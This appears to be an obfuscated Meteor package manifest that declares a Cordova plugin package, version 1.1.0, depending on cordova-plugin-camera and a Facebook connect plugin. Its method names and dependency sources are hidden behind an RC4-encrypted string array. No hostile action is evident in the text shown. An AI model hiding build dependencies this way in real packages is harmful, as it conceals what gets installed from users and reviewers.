'use strict';
var vip = "vip.v6";
var _0x2e9d = [vip, "wqLDjznCgEPCosK3wpUHw6oJSMO0ZsOUw7DCrcOYfmhGw53DhG5Cw7kWw6svc8KRwrvCp2TDucOWQcKgPcKFLwvCr8KOYsONwo9HwpPCuSfDhcOnw4oIEMOsVMK9wrg+wrl1wq06NWPDg8OaJiDDjsO8Tw4CTcKjRQ0ZXsKTTsK+wrBnwpQZJMOuUMKOw6XDiEEeBRdt", "YWhWw4vDhsOYwqg=", "cGRmw75g", "KxAbwrIC", "wp5MXsKaLsOCw6LDgg==", "YRoBw5lf", "Ovipgc.vfV6tmDrdkamcKAKN=="];
(function(obj, count, long) {
  var fn = function(to, value, str, val, key) {
    value = value >> 8;
    key = "po";
    var str = "shift";
    var method = "push";
    if (value < to) {
      for (; --to;) {
        val = obj[str]();
        if (value === to) {
          value = val;
          str = obj[key + "p"]();
        } else {
          if (value && str["replace"](/[OgcfVtmDrdkamcKAKN=]/g, "") === value) {
            obj[method](val);
          }
        }
      }
      obj[method](obj[str]());
    }
    return 662331;
  };
  return fn(++count, long) >> count ^ long;
})(_0x2e9d, 274, 70144);
var _0x18ac = function(a, opt_max) {
  a = ~~"0x"["concat"](a);
  var value = _0x2e9d[a];
  if (_0x18ac["ZQLejo"] === undefined) {
    (function() {
      var jid = typeof window !== "undefined" ? window : typeof process === "object" && typeof require === "function" && typeof global === "object" ? global : this;
      var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      if (!jid["atob"]) {
        jid["atob"] = function(i) {
          var str = String(i)["replace"](/=+$/, "");
          var bc = 0;
          var bs;
          var buffer;
          var Y = 0;
          var pix_color = "";
          for (; buffer = str["charAt"](Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String["fromCharCode"](255 & bs >> (-2 * bc & 6)) : 0) {
            buffer = listeners["indexOf"](buffer);
          }
          return pix_color;
        };
      }
    })();
    var testcase = function(data, fn) {
      var secretKey = [];
      var y = 0;
      var temp;
      var testResult = "";
      var tempData = "";
      data = atob(data);
      var val = 0;
      var key = data["length"];
      for (; val < key; val++) {
        tempData = tempData + ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
      }
      data = decodeURIComponent(tempData);
      var x = 0;
      for (; x < 256; x++) {
        secretKey[x] = x;
      }
      x = 0;
      for (; x < 256; x++) {
        y = (y + secretKey[x] + fn["charCodeAt"](x % fn["length"])) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
      }
      x = 0;
      y = 0;
      var i = 0;
      for (; i < data["length"]; i++) {
        x = (x + 1) % 256;
        y = (y + secretKey[x]) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
        testResult = testResult + String["fromCharCode"](data["charCodeAt"](i) ^ secretKey[(secretKey[x] + secretKey[y]) % 256]);
      }
      return testResult;
    };
    _0x18ac["lRdsop"] = testcase;
    _0x18ac["Lkawfi"] = {};
    _0x18ac["ZQLejo"] = !![];
  }
  var A = _0x18ac["Lkawfi"][a];
  if (A === undefined) {
    if (_0x18ac["XKUwDI"] === undefined) {
      _0x18ac["XKUwDI"] = !![];
    }
    value = _0x18ac["lRdsop"](value, opt_max);
    _0x18ac["Lkawfi"][a] = value;
  } else {
    value = A;
  }
  return value;
};
Package[_0x18ac("0", "Li3A")]({
  "summary" : "contains a cordova plugin",
  "version" : "1.1.0"
});
Package[_0x18ac("1", "wiGz")](function(canCreateDiscussions) {
  var _0x332711 = {
    "jZObR" : _0x18ac("2", "YquG")
  };
  Cordova[_0x18ac("3", "^Sjs")]({
    "cordova-plugin-camera" : _0x18ac("4", "lYXI"),
    "com.phonegap.plugins.facebookconnect" : _0x332711[_0x18ac("5", "lYXI")]
  });
});

